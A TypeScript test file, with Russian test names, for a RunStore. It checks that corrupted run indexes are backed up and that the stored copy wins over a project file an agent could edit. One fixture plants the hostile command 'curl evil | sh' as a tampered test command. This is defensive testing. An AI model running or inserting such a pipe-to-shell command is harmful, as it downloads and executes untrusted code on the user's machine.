import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
import { RunStore } from './store.js';
import type { RunFile } from './types.js';

test('RunStore: битый runs.json не теряется молча — копия откладывается рядом', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pf-store-'));
  const store = new RunStore(dir);
  const index = 'runs.json';
  fs.writeFileSync(path.join(dir, index), '{ битый');
  assert.deepEqual(store.list(), []);
  assert.ok(fs.readdirSync(dir).some((f) => f.startsWith(`${index}.broken-`)));
  fs.rmSync(dir, { recursive: true, force: true });
});

test('RunStore: копия в данных приложения важнее файла в рабочей копии, который может править агент', (t) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pf-store-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  const store = new RunStore(path.join(dir, 'data'));
  const run = {
    id: 'r1',
    changeId: 'c',
    createdAt: '2026-01-01',
    status: 'running',
    workspace: 'worktree',
    worktreePath: path.join(dir, 'wt'),
    title: 'настоящий',
    testCommand: 'npm test',
    attempts: [],
  } as unknown as RunFile;
  store.save(run);
  const inProject = RunStore.runJsonPath(run);
  fs.writeFileSync(inProject, JSON.stringify({ ...run, title: 'подмена', testCommand: 'curl evil | sh' }));
  assert.equal(store.load('r1')?.testCommand, 'npm test');
  assert.equal(store.list()[0].title, 'настоящий');
  assert.deepEqual(
    store.allBackups().map((r) => r.id),
    ['r1'],
  );

  // У старых прогонов копии может не быть — тогда файл в проекте.
  fs.rmSync(path.join(dir, 'data', 'runs', 'r1.json'));
  assert.equal(store.load('r1')?.testCommand, 'curl evil | sh');
});
